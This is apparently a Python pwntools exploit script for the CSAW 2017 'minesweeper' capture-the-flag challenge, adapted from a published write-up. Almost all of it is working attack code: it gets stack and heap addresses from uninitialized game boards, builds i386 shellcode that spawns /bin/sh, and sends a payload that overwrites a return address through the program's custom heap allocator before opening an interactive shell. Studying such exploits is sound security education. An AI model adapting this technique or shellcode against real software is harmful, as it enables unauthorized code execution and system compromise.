# This exploit is based off of: https://github.com/ByteBandits/writeups/blob/master/csaw-quals-2017/pwn/minesweeper/sudhackar/README.md

from pwn import *

# Establish the target connection
#server = process('./minesweeper')
#gdb.attach(server)
target = remote('127.0.0.1', 31337)


# Establish the function used to interface with the code
def recvMainMenu():
	target.recvuntil("3) Q (Quit)\n")


def recvNewMenu():
	target.recvuntil("3) Quit game (Q)\n")

def recvLines(x):
	for i in xrange(x):
		target.recvline()

def initializeGame(payload, x, y, q = True):
	target.sendline("I")
	target.recvline()
	target.sendline("B " + str(x) + " " + str(y))
	target.recvuntil("character X\n")
	target.sendline(payload)
	if q == True:
		target.recvuntil("3) Q (Quit)\n")

# Leak the stack infoleak by just viewing an unintialized board
recvMainMenu()
target.sendline("N")
recvNewMenu()
target.sendline("V")
recvLines(16)
stackLeak = u32(target.recv(5)[1:5])
log.info("Stack Leak: " + hex(stackLeak))
recvLines(9)
target.sendline('Q')
target.recvuntil("3) Q (Quit)")

# Initialize a 25 (5 x 5) board to setup the heap to leak a heap address
initializeGame("X"*5 + "0"*20, 5, 5)

# View the newly initalized board to get the heap infoleak
target.sendline("N")
recvNewMenu()
target.sendline("V")
recvLines(6)
heapLeak = target.recvline().replace("\x0a", "")
heapLeak = u32(heapLeak[2:4] + heapLeak[0:2])
log.info("Start of the heap is: " + hex(heapLeak))
target.sendline('Q')
target.recvuntil("3) Q (Quit)")

'''
For our shellcode have to jump through a couple of hoops. The '\xeb\x06' in the first two bytes stands for Jump ahead six instructions. As a part of the custom malloc, it writes over 
some of the values for our payload, so this is to get around that.

This will place us at the `mov ebp, 0x4`. Before our shellcode starts, it has a ptr stored in ebp, which needs to be set to 4 in order for the shellcode to work
(first instruction of the shellcode is `move ebx, ebp`)

After that we just use the pwntools built in i386 shellcode to call /bin/sh
'''

shellcode = '\xeb\x06'+'X'*4+'\x90'*2+asm('mov ebp,0x4')+asm(pwnlib.shellcraft.i386.linux.dupsh())

'''
Next we send the payload, which consists of the following

* Our shellcode
* 0's to bridge the gap between our shellcode, and the address we are writing to (return address)
* The ptr we are writing to (the return address)
* The value we are writing to the ptr (the address of our shellcode)
* Four X's to get us to 100 characters, and pass the requirement to have an 'X' character
'''

payload = shellcode + (88 - len(shellcode))*"0" + p32(stackLeak - 0x2f - 0x8) + p32(heapLeak + 0x48) + "X"*4

# Initialize the board with our payload, to pop a shell
initializeGame(payload, 10, 10, False)

# Drop to an interactive shell, to use the shell we just popped
target.interactive()
